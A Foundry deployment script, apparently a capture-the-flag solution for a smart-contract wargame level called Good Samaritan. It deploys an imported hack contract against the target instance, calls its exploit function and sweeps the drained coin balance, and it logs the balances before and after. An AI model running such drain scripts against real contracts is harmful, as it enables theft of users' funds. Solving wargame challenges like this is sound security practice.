// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "forge-std/Script.sol";
import "./27_GoodSamaritan.sol";
import "./27_GoodSamaritanHack.sol";

contract AttackerGoodSamaritanScript is Script {
    GoodSamaritan goodSamaritan = GoodSamaritan(vm.envAddress("INSTANCE"));

    function run() external {
        Coin coin = goodSamaritan.coin();
        console.log("wallet bal", coin.balances(address(goodSamaritan.wallet())));
        console.log("sender bal", coin.balances(msg.sender));

        vm.startBroadcast();
        GoodSamaritanHack goodSamaritanHack = new GoodSamaritanHack();
        goodSamaritanHack.exploit(address(goodSamaritan));
        goodSamaritanHack.sweepToken(address(coin));
        vm.stopBroadcast();

        console.log("wallet bal", coin.balances(address(goodSamaritan.wallet())));
        console.log("sender bal", coin.balances(msg.sender));
    }
}
